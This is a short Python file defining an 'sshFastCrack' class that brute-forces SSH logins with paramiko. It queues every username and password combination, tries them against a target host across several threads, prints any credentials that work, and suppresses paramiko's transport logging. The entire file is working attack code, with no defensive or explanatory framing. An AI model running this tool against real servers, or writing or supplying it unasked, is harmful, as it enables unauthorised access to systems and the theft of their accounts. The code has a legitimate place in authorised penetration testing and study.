from paramiko import SSHClient, SSHException,AutoAddPolicy,AuthenticationException
import time
import logging
import paramiko
import threading
from queue import Queue
from logging import NullHandler
import sys

class sshFastCrack:
	def __init__(self,arguments):	
		self.host,self.port,self.userlist,self.passlist,self.thread = arguments
		self.port      = int(self.port)
		self.thread    = int(self.thread)
		self.verbose   = True
		self.userqueue = Queue()
		self.passqueue = Queue()
		
	def login(self,user,word):
		sshclient = SSHClient()
		sshclient.set_missing_host_key_policy(AutoAddPolicy())
		try:
			sshclient.connect(self.host,port=self.port,username=user,password=word)
			print(f"[+] Found {user}--{word}")
		except AuthenticationException:
			if self.verbose:
				print(f"[-] {user}:{word} Failed!")
		except Exception as e:
			pass

	def QueuePut(self):
		for user in self.userlist:
			for word in self.passlist:
				self.userqueue.put(user)
				self.passqueue.put(word)
	def worker(self):
		
		while not self.userqueue.empty():
			user = self.userqueue.get()
			word = self.passqueue.get()
			self.login(user,word)
			
	def startAttack(self):
		logging.getLogger("paramiko.transport").addHandler(NullHandler())
		
		self.QueuePut()

		for _ in range(self.thread):
			attack = threading.Thread(target=self.worker)
			attack.start()
		
